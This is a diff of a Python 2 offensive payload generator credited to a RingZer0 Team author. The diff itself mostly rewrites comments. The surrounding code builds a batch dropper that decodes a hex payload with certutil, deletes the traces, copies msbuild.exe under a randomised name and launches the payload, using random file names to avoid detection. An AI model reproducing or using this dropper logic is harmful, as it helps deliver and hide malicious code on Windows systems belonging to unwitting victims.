@@ -1,6 +1,5 @@
 #!/usr/bin/env python2
 # Author: Mr.Un1k0d3r - RingZer0 Team 2017
-# with cmd enhancements by blark
 
 from __future__ import print_function
 import random
@@ -100,9 +99,9 @@ class Generator:
                 for i in xrange(3):
                     filepath.append(self.gen_str(random.randrange(8, 18)))
 
-                # if user is SYSTEM then use the msbuild path and perform msbuild copy
-                # otherwise work out of %temp% and don't copy the binary
-                # finally, if the decoded file already exists, just run it
+                # The cmd file first does a quck check for write access to the msbuild folder,
+                # if its unavailable use %temp% working directory instead. Next, check if the
+                # payload has already been decoded and skip re-creating the file if it exists.
                 payload = ("@ECHO OFF\r\n"
                            "set w=0 && set p=\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\\r\n"
                            "copy /Y NUL %p%\\{2} > NUL 2>&1 && set w=1\r\n"
@@ -122,7 +121,7 @@ class Generator:
                         msbuild = self.gen_process()
                 else:
                         msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
-                # decode paylod, copy msbuild, launch payload
+                # Decode paylod, copy msbuild, launch payload, delete files
                 payload += ("\r\ncertutil -decodehex %f0% %f1%\r\n"
                             "del %f0%\r\n"
                             "IF %w%==1 (copy %p%\\msbuild.exe %p%\\{0})\r\n"
